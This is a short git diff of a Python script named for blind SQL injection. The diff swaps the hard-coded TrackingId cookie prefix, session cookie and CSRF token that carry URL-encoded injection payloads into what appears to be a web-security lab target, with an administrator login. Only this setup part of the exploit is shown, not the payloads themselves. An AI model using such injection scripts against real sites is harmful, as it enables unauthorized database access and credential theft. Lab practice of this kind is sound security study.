@@ -20,12 +20,12 @@ def blind_sqli(url):
                 encoded_payload = requests.utils.quote(payload) # URL encoding the payload
                 
                 cookie = {
-                    "TrackingId":f"a4dNGU5qNflowViu{encoded_payload}", 
-                    "session":"DGYKGMVuHRffrYAd5Vj2IKbXqTNEPnfm"
+                    "TrackingId":f"oXQSd9Q1Kgn6SZ9H{encoded_payload}", 
+                    "session":"Foti57e0EIBIAnSq3XUuEW2vAEwwUHjS"
                     }
                 
                 data = {
-                    "csrf":"wXGHVuweg0ZzpptLXTZMKiUjMcHucoye", # Modify this csrf token to the one you get from the website.
+                    "csrf":"olNKxZ7vgVDPOL8dcn0vm2OPSZ9Vx0gq", # Modify this csrf token to the one you get from the website.
                     "username":"administrator", 
                     "password":"password"
                     }
